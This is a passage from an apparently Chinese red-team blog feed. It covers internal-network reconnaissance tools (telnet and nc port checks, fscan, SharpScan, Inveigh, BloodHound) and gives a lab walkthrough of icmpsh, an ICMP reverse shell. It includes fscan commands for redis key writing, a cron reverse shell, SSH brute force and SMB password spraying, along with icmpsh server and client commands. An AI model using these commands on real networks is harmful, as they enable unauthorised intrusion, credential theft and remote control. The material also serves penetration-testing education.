&lt;p>Telnet 协议是tcp/ip协议族的⼀员，是Internet远程登陆服务的标准协议和主要形式。&lt;br>
1.⾸先得开启服务&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">telnet 192.168.1.1 22
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">REM 批量扫描IP段（需提前启⽤Telnet客户端）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">for /l %i in (1,1,254) do @telnet 192.168.1.%i 80 &amp;gt; nul echo 192.168.1.%i:80 open
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="端banner信息">端⼝banner信息&lt;/h3>
&lt;p>如果通过扫描发现了端⼝，可以使⽤客户端连接⼯具或者nc，获取服务端的Banner信息。获 取 Banner 信 息 后 ， 可 以 在 漏 洞 库 中 查 找 对 应 cve 编 号 的 Poc 、 exp 、 在 exploitDB 、seebug等平台上查看相关的漏洞利⽤⼯具，然后到⽬标系统中验证漏洞是否存在，从⽽有针对性地进⾏安全加固。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">nc -nv 127.0.0.1 22
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">⽂件共享服务端⼝（21、22、69、2049、139、389）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">远程连接服务端⼝（22、23、3389、5900、5632）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Web应⽤服务端⼝（80、443、8080、7001、7002、8089、9090、4848、1352）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">数据库服务端⼝（3306、1433、1521、5432、6379、5000、9200）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">邮件服务端⼝（25、110、143）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">⽹络常⻅协议端⼝（53、67、68、161）
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="动化信息收集">⾃动化信息收集&lt;/h2>
&lt;h3 id="fscan">fscan&lt;/h3>
&lt;p>下载：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/shadow1ng/fscan
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>使用：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">fscan -h ip/24 -p port -o .txtc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan -h 192.168.101.1/24 启动fscan并扫描⽹段
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan.exe -h 192.168.x.x 默认使⽤全部模块
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan.exe -h 192.168.x.x -rf id_rsa.pub redis 写私钥
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan.exe -h 192.168.x.x -c whoami ssh爆破成功后，命令执⾏
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan.exe -h 192.168.x.x -m ms17010 指定模块
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan.exe -h 192.168.x.x -m ssh -p 2222 指定模块ssh和端⼝
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan.exe -h 192.168.x.x -h 192.168.1.1/24 C段
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan.exe -h 192.168.x.x -h 192.168.1.1/16 B段
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan.exe -h 192.168.x.x -h 192.168.1.1/8 A段的192.x.x.1和192.x.x.254,⽅便快速查看⽹段信息
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan.exe -h 192.168.x.x -hf ip.txt 以⽂件导⼊
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan -h 192.168.1.1/24 -np -no -nopoc (跳过存活检测 、不保存⽂件、跳过web poc扫描)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan -h 192.168.1.1/24 -rs 192.168.1.16666 (redis 计划任务反弹shell)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执⾏)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端⼝)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定⽂件的⽤户名、密码来进⾏爆破)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan -h 192.168.1.1/8 (A段的192.x.x.1和192.x.x.254,⽅便快速查看⽹段信息 )
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan -h 192.168.1.1/24 -m ms17010 (指定模块)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan -hf ip.txt (以⽂件导⼊)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./fscan -u http: baidu.com -proxy 8080 ( 扫 描 单 个 url, 并 设 置 http 代 理http: 127.0.0.18080)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="sharpscan">SharpScan&lt;/h3>
&lt;p>下载地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/INotGreen/SharpScan
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol>
&lt;li>C#开发的内⽹资产扫描器，⽅便内⽹横向移动和域内信息收集&lt;/li>
&lt;li>参考了Ladon，Fscan、Kscan等扫描器的⼯作原理&lt;/li>
&lt;li>为了兼容更古⽼的系统，所以采⽤.NET Framework3.5 和.NET Core6.0开发&lt;/li>
&lt;li>使⽤异步和⾼并发、扫描速度快并且可控、内存⾃动回收&lt;/li>
&lt;li>⽤Inline-assembly或者Execute-assembly进⾏内存加载，做到⽆⽂件落地扫描&lt;/li>
&lt;li>体积较⼩(⽬前800kb)、传输快、⾃动化扫描+内⽹信息收集⼀条⻰&lt;/li>
&lt;li>尽量遵循OPSEC原则，不创建net.exe、wmi.exe、reg.exe等额外的⼦进程操，减少⽇志记录&lt;br>
使用：&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">SharpScan.exe -h 192.168.12.1/24 -o output.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="inveigh">Inveigh&lt;/h3>
&lt;p>一款专注于内网协议欺骗与凭证捕获的PowerShell工具。&lt;br>
下载地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/Kevin-Robertson/Inveigh/releases
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="powersploit">PowerSploit&lt;/h3>
&lt;p>下载：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/PowerShellMafia/PowerSploit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="wmic_info">wmic_info&lt;/h3>
&lt;p>为了简化操作，可以创建⼀个脚本，在⽬标机器上完成流程、服务、⽤户账户、⽤户组、⽹络接⼝、硬盘信息、⽹络共享信息、操作系统、安装的补丁、安装的软件、启动时运⾏&lt;br>
的 程 序 、 时 区 等 信 息 的 查 询 ⼯ 作 。&lt;br>
下 载 地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>点击下载⽂件，然后⽣成了out.html&lt;/p>
&lt;h3 id="adexplorer">ADExplorer&lt;/h3>
&lt;p>使⽤ADExplorer轻松导航AD数据库，定义收藏夹位置，查看对象属性，⽆需打开对话框 、编辑权限、查看对象的模式，并执⾏复杂的搜索。&lt;br>
下载：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">learn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">microsoft&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">en&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">us&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sysinternals&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">downloads&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">adexplorer&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="bloodhound">BloodHound&lt;/h3>
&lt;p>BloodHound将域内⽤户、计算机、组、Sessions、ACLs以及域内所有相关⽤户、组、计算机、登陆信息、访问控制策略之间的关系更直观的展现在攻击者⾯前进⾏更便捷的分析域内情况，更快速的在域内提升⾃⼰的权限。&lt;br>
使⽤BloodHound轻松识别⾼度复杂的攻击路径，轻松深⼊了解Active Directory环境中的权限关系。&lt;br>
1）安装Neo4j&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">apt install neo4j -y
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">neo4j start
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>推两个Gith项⽬：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="err">项⽬地址：&lt;/span>&lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">github&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">Al1ex&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">CSPlugins&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">项⽬介绍：主要收集常⽤的&lt;/span>&lt;span class="n">CS好&lt;/span>&lt;span class="err">⽤的插件，涉及提权、漏洞利⽤、横向移动、信息收集、免杀等等&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">项⽬地址：&lt;/span>&lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">github&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">Al1ex&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">Pentest&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">tools&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">项⽬介绍：主要收集⼀些内⽹渗透测试中常⽤到的⼯具&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【隧道代理】icmpsh工具的使用</title><link>http://localhost:1313/p/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86icmpsh%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</link><pubDate>Wed, 10 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86icmpsh%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</guid><description>&lt;img src="http://localhost:1313/images/59.webp" alt="Featured image of post 【隧道代理】icmpsh工具的使用" />&lt;h1 id="icmpsh工具">icmpsh工具&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">icmpsh是⼀个简单的反向ICMP shell⼯具。与其他类似的开源⼯具相⽐，主要优势在于它不需要管理权限即可在⽬标机器上运⾏。 
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">客户端只能在Windows机器运⾏，服务端可以在任何平台上运⾏。
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="下载地址">下载地址&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/bdamele/icmpsh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="本地实验环境">本地实验环境&lt;/h2>
&lt;p>&lt;strong>kali攻击机： 192.168.197.129&lt;/strong>&lt;br>
&lt;strong>win10靶机：192.168.197.138&lt;/strong>&lt;/p>
&lt;h2 id="服务端">服务端&lt;/h2>
&lt;p>1.关闭icmp回复,如果要开启icmp回复，该值设置为0  因为icmpsh工具要代替系统本身的icmp应答程序，所以需要提前关闭本地系统的icmp应答，否则Shell的运行会不稳定&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">关闭icmp回复
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sysctl -w net.ipv4.icmp_echo_ignore_all=1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">开启icmp回复
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sysctl -w net.ipv4.icmp_echo_ignore_all=0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250910155900.png" alt="image.png">&lt;br>
2.安装get-pip.py&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python2 get-pip.py
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250910161525.png" alt="image.png">&lt;br>
3.安装impacket&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">这里我是下载完成后，上传到我的kali里进行安装
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://github.com/fortra/impacket/releases/tag/impacket_0_11_0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python2 setup.py install
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">或者：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># 安装兼容 Python 2 的 Impacket 版本（0.9.22 及以下）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">pip2 install impacket==0.9.22
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250910162903.png" alt="image.png">&lt;br>
运行，第⼀个IP是VPS的eth0网卡IP，第二个IP是目标机器出口的公网IP&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">python2 icmpsh_m.py 192.168.197.129 192.168.197.138
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250910162813.png" alt="image.png">&lt;/p>
&lt;h2 id="客户端">客户端&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">icmpsh.exe -t 192.168.197.129 -d 500 -b 30 -s 128
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-t 主机ip地址以发送ping请求。这个选项是强制性的！
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-r 发送⼀个包含字符串“Test1234”的测试icmp请求，然后退出。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-d 毫秒请求之间的延迟（毫秒）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-o 毫秒响应超时（毫秒）。如果没有及时收到回复，从机将增加空⽩计数器。如果该计数器达到某个极限，从机将退出。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">如果收到响应，计数器将设置回0。
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-b 空⽩数量限制（退出前未答复的icmp请求）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-s 字节最⼤数据缓冲区⼤⼩（字节）
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250910162737.png" alt="image.png">&lt;br>
&lt;strong>成功shell&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250910162753.png" alt="image.png">&lt;/p></description></item><item><title>【内网攻防】Windows工作组信息收集</title><link>http://localhost:1313/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2windows%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link><pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2windows%E5%B7%A5%E4%BD%9C%E7%BB%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid><description>&lt;img src="http://localhost:1313/images/13.webp" alt="Featured image of post 【内网攻防】Windows工作组信息收集" />&lt;h1 id="0x00-前置">0x00 前置&lt;/h1>
&lt;p>当红队渗透测试人员突破边界进入内网战场，面对复杂网络环境时，首要任务是构建四维立体情报模型，通过体系研判完成内网基础信息收集。这套基于实战场景的专业分析框架，可精准回答渗透过程中四个核心定位问题：&lt;br>
我是谁？&amp;ndash;主机身份与特权边界确认。&lt;br>
这是哪？&amp;ndash;对目前机器处网络环境的拓扑结构进行分析和判断。&lt;br>
我在哪？&amp;ndash;对目前机器所处伪造区域的判断。&lt;br>
谁在哪？&amp;ndash;对比钱机器反防御技术识别网络中的安全监控节点。&lt;/p>
&lt;h1 id="0x01-要收集的信息">0x01 要收集的信息&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
